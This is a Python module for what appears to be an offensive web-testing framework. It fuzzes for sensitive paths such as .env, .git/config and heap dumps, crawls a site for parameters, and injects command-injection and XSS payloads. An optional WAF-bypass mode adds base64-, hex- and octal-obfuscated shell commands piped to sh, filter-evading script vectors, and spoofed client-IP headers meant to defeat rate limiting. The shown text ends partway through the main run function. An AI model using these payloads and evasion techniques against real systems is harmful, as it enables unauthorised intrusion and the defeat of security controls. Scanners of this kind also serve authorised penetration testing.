"""
WebFuzzer — Directory Fuzzer + Parameter Spider (RCE / XSS parameter discovery)

Phases:
Phase 1:  Directory & file fuzzing (common path wordlist, soft-404 aware,
          optional recursive descent and file-extension expansion)
Phase 2:  Parameter spider — crawl links/forms/JS and extract GET+POST parameters
Phase 3:  RCE parameter testing — command injection (output & time-based)
Phase 4:  XSS parameter testing — reflected payload detection with context
          classification (script / event-handler / attribute / textarea)

Anti-false-positive design:
  * Soft-404 detection: a random nonexistent path is probed first; candidates
    whose status+body match the baseline are treated as catch-all pages and
    dropped instead of being reported as "found".
  * Baseline reflection check: every tested parameter receives one benign probe
    first. If the benign value bounces back, the param is reflective (XSS) and
    `;echo {tag}` style payloads are NOT treated as RCE proof.
  * Baseline timing: time-based RCE is only reported when the sleep payload is
    slower than the measured benign baseline (plus a margin), so slow servers
    do not produce false positives.
  * Output fingerprints (uid=/gid=/root:x:) are only accepted when they do not
    already appear in the baseline response.
  * XSS findings carry a reflection-context classification; inert contexts
    (inside quoted attributes / textarea) are downgraded to MEDIUM with a
    "verify" note instead of a blanket HIGH.
  * Encoded payload bugs fixed: newline and `&&` payloads now use real
    characters (correctly URL-encoded) so they actually execute.
"""

import os
import re
import time
import random
import base64
import ssl as ssl_mod
import threading
import urllib.request
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from urllib.parse import urljoin, urlparse

from webforg.core.module import BaseAuxiliaryModule, Option


# ============================================================================
# DIRECTORY FUZZ WORDLIST
# ============================================================================
DIR_WORDLIST = [
    "admin", "administrator", "api", "api/v1", "api/v2", "api/v3", "app",
    "assets", "auth", "backup", "backups", "bin", "cgi-bin", "config",
    "configuration", "connect", "contact", "content", "console", "css", "data",
    "database", "db", "debug", "default", "dev", "developer", "developers",
    "dist", "docs", "documentation", "download", "downloads", "dump", "env",
    "error", "errors", "explore", "favicon.ico", "feed", "files", "fonts",
    "form", "forms", "forum", "grafana", "graphql", "health", "home", "html",
    "images", "img", "includes", "index", "info", "install", "internal", "jenkins",
    "js", "json", "kibana", "lang", "lib", "libs", "login", "logout", "mail",
    "manage", "manager", "media", "metrics", "minio", "mobile", "module",
    "modules", "nacos", "news", "node_modules", "oauth", "openapi", "panel",
    "phpmyadmin", "plugins", "portal", "post", "posts", "private", "prometheus",
    "public", "readme", "redirect", "register", "robots.txt", "root", "s3",
    "search", "secure", "server", "service", "services", "session", "settings",
    "sitemap.xml", "src", "static", "status", "store", "support", "swagger",
    "swagger-ui", "system", "target", "temp", "test", "tests", "themes", "tmp",
    "tools", "top", "trace", "upload", "uploads", "user", "users", "vault",
    "vendor", "version", "web", "webapi", "webdav", "webmail", "www",
    "xmlrpc.php", "index.php", "index.html", "login.php", "admin.php",
    "config.php", "info.php", ".env", ".env.production", ".git/HEAD",
    ".git/config", ".htaccess", ".htpasswd", ".svn/entries",
    "docker-compose.yml", "package.json", "composer.json", "web.config",
    "wp-admin", "wp-content", "wp-includes", "wp-json", "wp-login.php",
    "actuator", "actuator/env", "actuator/heapdump", "swagger.json",
    "openapi.json", "graphiql", "phpinfo.php", "crossdomain.xml",
    "server-status", "server-info", ".well-known/security.txt", "metrics",
    "db.sqlite3", "backup.zip", "dump.sql", "index.php.bak", "config.php.bak",
]

# ============================================================================
# PARAMETER SPIDER REGEXES
# ============================================================================
HREF_RE = re.compile(r'href=["\']([^"\'#]+)["\']', re.I)
FORM_RE = re.compile(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>', re.I | re.S)
INPUT_RE = re.compile(r'<input[^>]*name=["\']([^"\']+)["\']', re.I)
SELECT_RE = re.compile(r'<select[^>]*name=["\']([^"\']+)["\']', re.I)
TEXTAREA_RE = re.compile(r'<textarea[^>]*name=["\']([^"\']+)["\']', re.I)
FORM_METHOD_RE = re.compile(r'<form[^>]*method=["\'](get|post)["\']', re.I)
FETCH_RE = re.compile(r'''\b(?:fetch|axios|\.get|\.post|\.ajax|\.request)\s*\(?\s*["']([^"']*)["']''', re.I)
SCRIPT_SRC_RE = re.compile(r'<script[^>]*src=["\']([^"\']+)["\']', re.I)

# ============================================================================
# INJECTION PAYLOADS
# ============================================================================
# NOTE: values are the raw injected strings — URL-encoding happens in the
# transport layer, so `&&` / newlines / `${IFS}` reach the app decoded and
# actually execute (previous "%0a"/"%26%26" literals were double-encoded and
# never worked).
RCE_PAYLOADS = [
    ("semicolon_id", ";id"),
    ("semicolon_echo", ";echo {tag}"),
    ("pipe_id", "|id"),
    ("pipe_echo", "|echo {tag}"),
    ("double_amp_id", "&&id"),
    ("double_amp_echo", "&&echo {tag}"),
    ("or_id", "||id"),
    ("or_echo", "||echo {tag}"),
    ("subshell_id", "$(id)"),
    ("subshell_echo", "$(echo {tag})"),
    ("backtick_id", "`id`"),
    ("backtick_echo", "`echo {tag}`"),
    ("newline_id", "\nid"),
    ("newline_echo", "\necho {tag}"),
    ("ifs_id", "${IFS}id"),
    ("ifs_echo", "${IFS}echo${IFS}{tag}"),
    ("amp_echo_win", "&echo {tag}"),
    ("semicolon_sleep", ";sleep 4"),
    ("or_sleep", "||sleep 4"),
    ("ping_win", "&ping -n 5 127.0.0.1"),
]

XSS_PAYLOADS = [
    ("script_tag", "<script>alert(1)</script>", "<script>alert(1)</script>"),
    ("img_onerror", "<img src=x onerror=alert(1)>", "onerror=alert(1)"),
    ("svg_onload", "<svg/onload=alert(1)>", "onload=alert(1)"),
    ("img_srcset", "<img srcset=x onerror=alert(1)>", "srcset=x onerror"),
    ("details_ontoggle", "<details open ontoggle=alert(1)>", "ontoggle=alert(1)"),
    ("input_onfocus", "<input autofocus onfocus=alert(1)>", "autofocus onfocus"),
    ("video_source", "<video><source onerror=alert(1)>", "<source onerror"),
    ("breakout", "\"><script>alert(1)</script>", "<script>alert(1)</script>"),
    ("svg_breakout", "'\"><svg/onload=alert(1)>", "<svg/onload"),
    ("textarea_breakout", "</textarea><script>alert(1)</script>", "</textarea><script>"),
    ("javascript_uri", "javascript:alert(1)", "javascript:alert(1)"),
]

ECHO_PAYLOAD_NAMES = {
    "semicolon_echo", "pipe_echo", "double_amp_echo", "or_echo",
    "subshell_echo", "backtick_echo", "newline_echo", "ifs_echo",
    "amp_echo_win", "waf_b64_echo",
}
WINDOWS_PAYLOAD_NAMES = {"amp_echo_win", "ping_win"}
SLEEP_PAYLOAD_NAMES = {"semicolon_sleep", "or_sleep", "ping_win",
                       "waf_b64_sleep", "waf_xxd_sleep", "waf_octal_sleep",
                       "waf_ifs_sleep", "waf_tab_sleep", "waf_newline_sleep"}

# WAF / IPS evasion payloads (only used when WAF_BYPASS is enabled).
# A leading newline separates the injected command from the benign value
# (dash/sh reject a leading `;`). {b64_id}/{b64_echo}/{b64_sleep} and
# {hex_id}/{hex_sleep}/{octal_id} are filled in at request time so the raw
# payload never contains obvious keywords such as `id`, `sleep` or `base64`.
WAF_RCE_PAYLOADS = [
    ("waf_b64_id", "\necho {b64_id} | base64 -d | sh"),
    ("waf_b64_echo", "\necho {b64_echo} | base64 -d | sh"),
    ("waf_b64_sleep", "\necho {b64_sleep} | base64 -d | sh"),
    ("waf_xxd_id", "\necho {hex_plain_id} | xxd -r -p | sh"),
    ("waf_xxd_sleep", "\necho {hex_plain_sleep} | xxd -r -p | sh"),
    ("waf_octal_id", "\nprintf '{octal_id}' | sh"),
    ("waf_octal_sleep", "\nprintf '{octal_sleep}' | sh"),
    ("waf_ifs_sleep", "\nsleep$IFS$9 4"),
    ("waf_tab_sleep", "\nsleep\t4"),
    ("waf_newline_sleep", "\nsleep 4"),
]

WAF_XSS_PAYLOADS = [
    ("waf_mixed_case", "<sCrIpT>alert(1)</sCrIpT>", "<sCrIpT>"),
    ("waf_breakout_single", "'><script>alert(1)</script>", "'><script>"),
    ("waf_broken_tag", "<scr<script>ipt>alert(1)</script>", "<scr<script>"),
    ("waf_data_uri", "<script src=data:,alert(1)></script>", "data:,alert(1)"),
    ("waf_entity_scheme", '<a href="javascript&colon;alert(1)">x</a>', "javascript&colon;"),
    ("waf_svg_double", '"><svg onload=alert(1)>', "<svg onload"),
    ("waf_unicode_onerror", '<img src=x onerror="\\u0061lert(1)">', "\\u0061lert"),
    ("waf_js_escape", "<script>eval(\\x61lert)(1)</script>", "\\x61lert"),
    ("waf_backtick", "<svg/onload=top[`alert`](1)>", "top[`alert`]"),
    # prompt()/confirm()-based vectors with handlers that many WAFs don't flag
    ("waf_prompt_focus", "<input autofocus onfocus=prompt(1)>", "onfocus=prompt(1)"),
    ("waf_prompt_mouseover", "<svg onmouseover=prompt(1)>", "onmouseover=prompt(1)"),
    ("waf_prompt_pageshow", "<body onpageshow=prompt(1)>", "onpageshow=prompt(1)"),
    ("waf_prompt_toggle", "<details open ontoggle=prompt(1)>", "ontoggle=prompt(1)"),
]

# Spoofed-client headers used to slip past IP-based WAF / rate limiting.
WAF_HEADERS = ("X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Client-IP", "True-Client-IP")

WAF_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

RCE_EVIDENCE_RE = re.compile(r'(?:uid=\d+\(|gid=\d+\(|root:x:)')
WINDOWS_SERVER_RE = re.compile(r'(?:IIS|Microsoft|WinHttp|PWS|ASP\.NET)', re.I)

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"


def _norm(body: str) -> str:
    """Normalize a body for soft-404 comparison (strip all whitespace)."""
    return re.sub(r"\s+", "", body or "")


def _b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def _hex_plain(s: str) -> str:
    return "".join(f"{ord(c):02x}" for c in s)


def _oct_escape(s: str) -> str:
    return "".join(f"\\{oct(ord(c))[2:]}" for c in s)


def _random_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


class WebFuzzer(BaseAuxiliaryModule):
    """Directory fuzzer + parameter spider with RCE/XSS parameter testing."""

    name = "WebFuzzer — Directory Fuzzer & Parameter Spider (RCE/XSS)"
    author = "WebForge"
    severity = "INFO"
    description = "Discover hidden paths and test every discovered parameter for command injection (RCE) and reflected XSS"

    def _build_options(self):
        self.add_option("RHOSTS", Option(str, required=False, description="Target host"))
        self.add_option("RPORT", Option(int, required=False, default=None, description="Target port"))
        self.add_option("SSL", Option(bool, required=False, default=False, description="Use HTTPS"))
        self.add_option("TARGETURI", Option(str, required=False, default="/", description="Base path"))
        self.add_option("TIMEOUT", Option(int, required=False, default=8, description="HTTP timeout"))
        self.add_option("THREADS", Option(int, required=False, default=10, description="Concurrent threads"))
        self.add_option("FUZZ_DIRS", Option(bool, required=False, default=True, description="Run directory fuzzing"))
        self.add_option("FUZZ_WORDLIST", Option(str, required=False, default="",
                                                description="Extra words (comma separated) or a file path"))
        self.add_option("EXTENSIONS", Option(str, required=False, default="",
                                             description="Append file extensions to bare words (e.g. '.php,.js,.bak')"))
        self.add_option("MAX_DIRS", Option(int, required=False, default=200, description="Max directory candidates"))
        self.add_option("MAX_DEPTH", Option(int, required=False, default=0,
                                            description="Recurse into discovered directories (levels, 0 = off)"))
        self.add_option("SPIDER", Option(bool, required=False, default=True, description="Run parameter spider"))
        self.add_option("MAX_CRAWL", Option(int, required=False, default=25, description="Max pages to crawl"))
        self.add_option("TEST_RCE", Option(bool, required=False, default=True, description="Test params for RCE"))
        self.add_option("TEST_XSS", Option(bool, required=False, default=True, description="Test params for XSS"))
        self.add_option("MAX_PARAM_TESTS", Option(int, required=False, default=150, description="Max params to test"))
        self.add_option("EXTRA_HEADERS", Option(str, required=False, default="",
                                                description="Custom headers 'Name: Value, N2: V2'"))
        self.add_option("WAF_BYPASS", Option(bool, required=False, default=False,
                                             description="Enable WAF/IPS evasion: obfuscated payloads + spoofed client headers"))

    # ── HTTP helper ──────────────────────────────────────────────────────────
    def _http(self, url: str, method: str = "GET", data: bytes | None = None,
              headers: dict | None = None, timeout: int | None = None) -> tuple[str, int, dict]:
        """Return (body, status, headers). On failure returns ("", 0, {})."""
        try:
            req = urllib.request.Request(url, data=data, method=method)
            if getattr(self, "_waf_bypass", False):
                req.add_header("User-Agent", random.choice(WAF_USER_AGENTS))
                for h in WAF_HEADERS:
                    req.add_header(h, _random_ip())
            else:
                req.add_header("User-Agent", USER_AGENT)
            for k, v in self._extra_headers.items():
                req.add_header(k, v)
            for k, v in (headers or {}).items():
                req.add_header(k, v)
            resp = self._opener.open(req, timeout=timeout or self._timeout)
            body = resp.read(200000).decode("utf-8", "replace")
            return body, resp.status, dict(resp.headers)
        except urllib.request.HTTPError as e:
            body = e.read(200000).decode("utf-8", "replace") if e.code not in (301, 302, 303, 307, 308) else ""
            return body, e.code, dict(e.headers) if hasattr(e, "headers") else {}
        except Exception:
            return "", 0, {}

    # ── Phase 1: directory fuzzing (soft-404 aware, optional recursion) ──────
    def _build_wordlist(self) -> list[str]:
        words = list(dict.fromkeys(DIR_WORDLIST))
        extra_val = (self.get_option("FUZZ_WORDLIST") or "").strip()
        if extra_val:
            if os.path.exists(extra_val):
                with open(extra_val, encoding="utf-8", errors="replace") as f:
                    extra = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
            else:
                extra = [w.strip().strip("/") for w in extra_val.split(",") if w.strip()]
            for w in extra:
                if w and w not in words:
                    words.append(w)
        exts = [e.strip().lstrip(".") for e in (self.get_option("EXTENSIONS") or "").split(",") if e.strip()]
        if exts:
            expanded: list[str] = []
            for w in words:
                expanded.append(w)
                last = w.rsplit("/", 1)[-1]
                if "." not in last:
                    for e in exts:
                        expanded.append(f"{w}.{e}")
            words = expanded
        return words

    def _soft404_baseline(self, base_url: str) -> dict:
        rnd = f"wf404_{random.randint(10**6, 10**9)}"
        url = f"{base_url.rstrip('/')}/{rnd}"
        body, status, headers = self._http(url)
        return {"status": status, "body_norm": _norm(body), "loc": headers.get("Location", "")}

    def _classify_missing(self, status: int, body: str, headers: dict, baseline: dict) -> str | None:
        """Classify a non-existent-path response.

        Returns "soft404" when a missing path masquerades as a success page,
        "missing" for an ordinary hard 404, or None when the response differs
        from the baseline (i.e. the resource really exists).
        """
        if baseline["status"] == 0:
            return None
        bnorm = baseline["body_norm"]
        loc = headers.get("Location", "")
        base_status = baseline["status"]
        base_ok = 200 <= base_status < 400
        body_matches = bool(bnorm) and _norm(body) == bnorm
        loc_matches = bool(loc) and bool(baseline["loc"]) and loc == baseline["loc"]
        if body_matches or loc_matches:
            if base_ok:
                return "soft404"
            # baseline was itself an error page: an identical body just means
            # the path is absent (hard 404), not a catch-all success page.
            return "missing"
        return None

    def _fuzz_directories(self, base_url: str) -> dict:
        words = self._build_wordlist()
        max_dirs = self.get_option("MAX_DIRS") or 200
        max_depth = self.get_option("MAX_DEPTH") or 0
        baseline = self._soft404_baseline(base_url)

        found: list[dict] = []
        seen: set[str] = set()
        soft404 = 0
        lock = threading.Lock()
        total_budget = max_dirs * (max_depth + 1)
        budget_left = total_budget

        def is_dir_word(word: str) -> bool:
            return "." not in word.rsplit("/", 1)[-1]

        # level 0 candidates are the wordlist; deeper levels are wordlist words
        # prefixed by a discovered directory word.
        level_candidates: list[str] = words[:]

        for level in range(max_depth + 1):
            if not level_candidates or budget_left <= 0 or self._stop:
                break
            batch = level_candidates[:budget_left]
            budget_left -= len(batch)
            results: list[dict] = []

            def probe(word: str):
                if self._stop:
                    return None
                url = f"{base_url.rstrip('/')}/{word}"
                with lock:
                    if url in seen:
                        return None
                    seen.add(url)
                body, status, headers = self._http(url)
                return {"word": word, "url": url, "body": body, "status": status, "headers": headers}

            with ThreadPoolExecutor(max_workers=self._threads) as ex:
                futures = [ex.submit(probe, w) for w in batch]
                for f in as_completed(futures):
                    r = f.result()
                    if not r:
                        continue
                    if WINDOWS_SERVER_RE.search(r["headers"].get("Server", "")):
                        self._windows_hint = True
                    cls = self._classify_missing(r["status"], r["body"], r["headers"], baseline)
                    if cls == "soft404":
                        with lock:
                            soft404 += 1
                        continue
                    if cls == "missing":
                        continue
                    status = r["status"]
                    loc = r["headers"].get("Location", "")
                    if status in (200, 301, 302, 303, 307, 308, 401, 403, 405):
                        note = ""
                        if status in (301, 302, 303, 307, 308) and loc:
                            note = f"redirect → {loc[:80]}"
                        elif status in (401, 403):
                            note = "exists but protected"
                        entry = {
                            "url": r["url"], "status": status, "size": len(r["body"]),
                            "redirect": loc[:120], "note": note,
                            "server": (r["headers"].get("Server") or "")[:60],
                        }
                        with lock:
                            found.append(entry)
                            results.append(entry)

            # build candidates for the next level from directory-like results
            if level < max_depth:
                sub_words = [w for w in words[: max_dirs // 2] if is_dir_word(w)]
                next_candidates: list[str] = []
                for e in results:
                    if e["status"] in (200, 301, 302, 303, 307, 308, 401, 403) and is_dir_word(e["url"].split("/")[-1]):
                        for sw in sub_words:
                            word = e["url"].split("/")[-1]
                            next_candidates.append(f"{word}/{sw}")
                level_candidates = next_candidates

        found.sort(key=lambda x: (x["status"], x["url"]))
        return {"found": found, "soft404": soft404}

    # ── Phase 2: parameter spider ────────────────────────────────────────────
    def _spider_params(self, base_url: str) -> dict:
        crawled: set[str] = set()
        queue: list[str] = [base_url]
        endpoints: dict[str, dict] = {}
        forms_found: list[dict] = []
        lock = threading.Lock()

        def is_same_host(url: str) -> bool:
            try:
                return urlparse(url).netloc == self._netloc
            except Exception:
                return False

        def record_endpoint(method: str, path: str, param_names: list[str], source: str):
            if not param_names:
                return
            key = f"{method.upper()}:{path}"
            with lock:
                ep = endpoints.setdefault(key, {"method": method.upper(), "path": path, "params": {}})
                for p in param_names:
                    if p.strip() and p.strip() not in ep["params"]:
                        ep["params"][p.strip()] = source

        def process_page(url: str, body: str):
            parsed = urlparse(url)
            record_endpoint("GET", parsed.path, [k for k, _ in urllib.parse.parse_qsl(parsed.query) if k], "url")

            for m in HREF_RE.finditer(body):
                href = m.group(1)
                full = urljoin(url, href)
                if not is_same_host(full):
                    continue
                hparsed = urlparse(full)
                qparams = [k for k, _ in urllib.parse.parse_qsl(hparsed.query) if k]
                if qparams:
                    record_endpoint("GET", hparsed.path, qparams, "link")
                if hparsed.scheme in ("http", "https") and len(crawled) < self._max_crawl:
                    clean = f"{hparsed.scheme}://{hparsed.netloc}{hparsed.path}"
                    if clean and clean not in crawled and clean not in queue:
                        queue.append(clean)

            for m in SCRIPT_SRC_RE.finditer(body):
                src = urljoin(url, m.group(1))
                if is_same_host(src) and ".js" in src:
                    js_body, _, _ = self._http(src)
                    if isinstance(js_body, str):
                        for u in re.findall(r'["\']([^"\']*\?[^"\']*)["\']', js_body):
                            full = urljoin(src, u)
                            if is_same_host(full):
                                qparams = [k for k, _ in urllib.parse.parse_qsl(urlparse(full).query)]
                                if qparams:
                                    record_endpoint("GET", urlparse(full).path, qparams, "js")

            for m in FETCH_RE.finditer(body):
                target = m.group(1)
                if target.startswith("/") or target.startswith("http"):
                    full = urljoin(url, target)
                    if is_same_host(full) and "?" in full:
                        tparsed = urlparse(full)
                        qparams = [k for k, _ in urllib.parse.parse_qsl(tparsed.query) if k]
                        if qparams:
                            record_endpoint("GET", tparsed.path, qparams, "js")

            for fm in FORM_RE.finditer(body):
                action = fm.group(1)
                form_html = fm.group(2)
                action_url = urljoin(url, action)
                if not is_same_host(action_url):
                    continue
                method = "GET"
                mm = FORM_METHOD_RE.search(fm.group(0))
                if mm:
                    method = mm.group(1).upper()
                names = (INPUT_RE.findall(form_html) + SELECT_RE.findall(form_html)
                         + TEXTAREA_RE.findall(form_html))
                names = [n for n in names if n and not n.lower().startswith(("submit", "button", "hidden=_", "_"))]
                if action_url and names:
                    ap = urlparse(action_url)
                    record_endpoint(method, ap.path, names, "form")
                    with lock:
                        forms_found.append({
                            "action": action_url, "method": method,
                            "params": names, "source": url,
                        })

        with ThreadPoolExecutor(max_workers=self._threads) as ex:
            def crawl(url: str):
                if self._stop or url in crawled or len(crawled) >= self._max_crawl:
                    return None
                crawled.add(url)
                try:
                    body, status, _ = self._http(url)
                    if body and status == 200:
                        process_page(url, body)
                except Exception:
                    # never let one malformed/odd page abort the whole scan
                    pass
                return None

            # keep going while URLs are queued OR workers are still running —
            # process_page() appends new URLs before its future resolves, so
            # waiting for all in-flight futures guarantees the queue is drained.
            futures: set = set()
            while (queue or futures) and len(crawled) < self._max_crawl:
                while queue and len(futures) < self._threads * 2:
                    futures.add(ex.submit(crawl, queue.pop(0)))
                if futures:
                    _, futures = wait(futures, return_when=FIRST_COMPLETED)
            for f in futures:
                f.result()

        return {"pages": len(crawled), "forms": forms_found, "endpoints": list(endpoints.values())}

    # ── Phase 3/4: parameter injection testing ───────────────────────────────
    def _test_parameters(self, base_url: str, endpoints: list[dict]) -> list[dict]:
        findings: list[dict] = []
        lock = threading.Lock()
        jobs: list[tuple[str, dict, str]] = []

        budget = self._max_param_tests
        for ep in endpoints:
            for param in list(ep["params"].keys())[:10]:
                if budget <= 0:
                    break
                jobs.append((f"{ep['method']}:{ep['path']}:{param}", ep, param))
                budget -= 1

        def build_get_url(ep: dict, param: str, value: str) -> str:
            path = ep["path"] or "/"
            if not path.startswith("/"):
                path = "/" + path
            url = f"{self._base.rstrip('/')}{path}"
            q = urllib.parse.urlencode({param: value})
            sep = "&" if "?" in url else "?"
            return f"{url}{sep}{q}"

        def build_post_data(ep: dict, param: str, value: str) -> bytes:
            data = {k: "wf_test" for k in ep["params"]}
            data[param] = value
            return urllib.parse.urlencode(data).encode()

        def _baseline(ep: dict, param: str) -> dict:
            """One benign probe: is the param reflective + how slow is it.

            Time-based gating is only reliable if the baseline itself is not
            polluted by one-off latency (e.g. cold DNS lookups), so we probe up
            to twice and keep the fastest sample.
            """
            probe = "wfbase" + str(random.randint(10**7, 10**9))
            method = ep["method"]
            body = ""
            elapsed_min: float | None = None
            for _ in range(2):
                t0 = time.time()
                if method == "POST":
                    body, _, _ = self._http(
                        f"{self._base.rstrip('/')}{ep['path']}",
                        method="POST", data=build_post_data(ep, param, probe),
                        headers={"Content-Type": "application/x-www-form-urlencoded"})
                else:
                    body, _, _ = self._http(build_get_url(ep, param, probe))
                elapsed = time.time() - t0
                if elapsed_min is None or elapsed < elapsed_min:
                    elapsed_min = elapsed
                if elapsed_min < 1.0:
                    break
            return {
                "reflective": bool(body and probe in body),
                "elapsed": elapsed_min or 0.0,
                "body": body or "",
            }

        def test_rce(ep: dict, param: str, base: dict):
            if self._stop:
                return None
            tag = "wf" + str(random.randint(10**7, 10**9))
            method = ep["method"]
            endpoint_url = f"{self._base.rstrip('/')}{ep['path']}"
            reflective = base["reflective"]
            payloads = RCE_PAYLOADS + (WAF_RCE_PAYLOADS if self._waf_bypass else [])
            for name, tmpl in payloads:
                if name in ECHO_PAYLOAD_NAMES and reflective:
                    continue
                if name in WINDOWS_PAYLOAD_NAMES and not self._windows_hint:
                    continue
                payload = tmpl.replace("{tag}", tag)
                if self._waf_bypass:
                    payload = (payload
                               .replace("{b64_id}", _b64("id"))
                               .replace("{b64_echo}", _b64(f"echo {tag}"))
                               .replace("{b64_sleep}", _b64("sleep 4"))
                               .replace("{hex_plain_id}", _hex_plain("id"))
                               .replace("{hex_plain_sleep}", _hex_plain("sleep 4"))
                               .replace("{octal_id}", _oct_escape("id"))
                               .replace("{octal_sleep}", _oct_escape("sleep 4")))
                t0 = time.time()
                if method == "POST":
                    body, _, _ = self._http(
                        endpoint_url, method="POST", data=build_post_data(ep, param, payload),
                        headers={"Content-Type": "application/x-www-form-urlencoded"})
                else:
                    body, _, _ = self._http(build_get_url(ep, param, payload))
                elapsed = time.time() - t0

                evidence = ""
                if tag and tag in body and not reflective:
                    evidence = f"command output marker echoed: {tag}"
                elif RCE_EVIDENCE_RE.search(body) and not RCE_EVIDENCE_RE.search(base["body"]):
                    evidence = "command output fingerprint matched (uid=/gid=/root:x:)"
                elif name in SLEEP_PAYLOAD_NAMES and elapsed >= max(3.5, base["elapsed"] + 3.0):
                    evidence = (f"time-based: request took {elapsed:.1f}s "
                                f"vs baseline {base['elapsed']:.2f}s")

                if evidence:
                    return {
                        "type": "rce",
                        "severity": "CRITICAL" if name not in SLEEP_PAYLOAD_NAMES else "HIGH",
                        "url": endpoint_url, "method": method, "param": param,
                        "payload": payload, "technique": name,
                        "evidence": evidence,
                        "confidence": "high" if not name in SLEEP_PAYLOAD_NAMES else "medium",
                    }
            return None

        def _classify_xss_context(body: str, marker: str, payload: str) -> str:
            pos = body.find(marker)
            if pos < 0:
                return "html_body"
            before = body[max(0, pos - 120):pos].lower()
            # raw-text containers first — quote parity is meaningless inside them
            for tag in ("<template", "<title", "<style", "<noscript"):
                if tag in before:
                    return "textarea_inert"
            if "<textarea" in before:
                # closing-tag breakout (</textarea><script>) escapes the container
                if "</textarea>" in payload.lower():
                    return "html_body"
                return "textarea_inert"
            if before.count('"') % 2 == 1:
                if '">' in payload or payload.startswith("'"):
                    return "attribute_breakout"
                return "attribute_inert"
            if "<script" in before:
                return "script_context"
            if any(h in payload.lower() for h in
                   ("onerror=", "onload=", "onfocus=", "ontoggle=", "onmouseover=", "onclick=")):
                return "event_handler"
            if "javascript:" in payload and "href=" in before:
                return "href_javascript"
            return "html_body"

        def _xss_severity(context: str, technique: str) -> str:
            if context in ("script_context", "event_handler", "attribute_breakout", "href_javascript"):
                return "HIGH"
            if context in ("attribute_inert", "textarea_inert"):
                return "MEDIUM"
            if technique == "javascript_uri":
                return "MEDIUM"
            return "HIGH"

        def _xss_confidence(context: str) -> str:
            if context in ("script_context", "event_handler", "attribute_breakout", "href_javascript"):
                return "high"
            return "medium"

        def _is_html_response(content_type: str) -> bool:
            ct = (content_type or "").lower()
            if not ct:
                return True
            return "text/html" in ct or "application/xhtml" in ct

        SEV_RANK = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

        def test_xss(ep: dict, param: str):
            if self._stop:
                return None
            method = ep["method"]
            endpoint_url = f"{self._base.rstrip('/')}{ep['path']}"
            best: dict | None = None
            xss_payloads = XSS_PAYLOADS + (WAF_XSS_PAYLOADS if self._waf_bypass else [])
            for name, payload, marker in xss_payloads:
                if method == "POST":
                    body, _, headers = self._http(
                        endpoint_url, method="POST", data=build_post_data(ep, param, payload),
                        headers={"Content-Type": "application/x-www-form-urlencoded"})
                else:
                    body, _, headers = self._http(build_get_url(ep, param, payload))
                if not body or marker not in body:
                    continue
                if not _is_html_response(headers.get("Content-Type", "")):
                    cand = {
                        "type": "xss", "severity": "INFO",
                        "url": endpoint_url, "method": method, "param": param,
                        "payload": payload, "technique": name,
                        "evidence": "payload reflected, but response is non-HTML (not directly exploitable)",
                        "confidence": "info", "context": "non_html",
                    }
                else:
                    context = _classify_xss_context(body, marker, payload)
                    cand = {
                        "type": "xss",
                        "severity": _xss_severity(context, name),
                        "url": endpoint_url, "method": method, "param": param,
                        "payload": payload, "technique": name,
                        "evidence": f"payload marker reflected unencoded in {context}: {marker[:40]}",
                        "confidence": _xss_confidence(context),
                        "context": context,
                    }
                if best is None or SEV_RANK[cand["severity"]] < SEV_RANK[best["severity"]]:
                    best = cand
                # an inert context (attribute/textarea) can still be escaped by
                # a later breakout payload — keep testing until we hit HIGH.
                if best["severity"] in ("CRITICAL", "HIGH"):
                    break
            return best

        def run_one(job):
            key, ep, param = job
            base = _baseline(ep, param) if (self.get_option("TEST_RCE")) else None
            rce = test_rce(ep, param, base) if self.get_option("TEST_RCE") else None
            xss = test_xss(ep, param) if self.get_option("TEST_XSS") else None
            res = [f for f in (rce, xss) if f]
            for f in res:
                f["param_map"] = {p: src for p, src in ep["params"].items()}
            return res

        with ThreadPoolExecutor(max_workers=self._threads) as ex:
            futures = {ex.submit(run_one, j): j for j in jobs}
            for f in as_completed(futures):
                for item in f.result() or []:
                    with lock:
                        findings.append(item)

        findings.sort(key=lambda x: (x["type"], x["url"], x["param"]))
        return findings

    # ── main ─────────────────────────────────────────────────────────────────
    def run(self) -> dict:
        host = self.get_option("RHOSTS") or "127.0.0.1"
        port = self.get_option("RPORT")
        if port is None:
            port = 443 if self.get_option("SSL") else 80
        ssl_ = bool(self.get_option("SSL"))
        path = self.get_option("TARGETURI") or "/"

        self._timeout = self.get_option("TIMEOUT")
        self._threads = self.get_option("THREADS")
        self._max_crawl = self.get_option("MAX_CRAWL")
        self._max_param_tests = self.get_option("MAX_PARAM_TESTS")
        self._waf_bypass = bool(self.get_option("WAF_BYPASS"))
        self._stop = False
        self._windows_hint = False
        self._extra_headers = {}
        for part in (self.get_option("EXTRA_HEADERS") or "").split(","):
            if ":" in part:
                k, v = part.split(":", 1)
                if k.strip():
                    self._extra_headers[k.strip()] = v.strip()

        scheme = "https" if ssl_ else "http"
        base_url = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"
        self._base = base_url.rstrip("/") + "/" + path.strip("/")
        self._netloc = urlparse(self._base).netloc

        ctx = ssl_mod.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl_mod.CERT_NONE
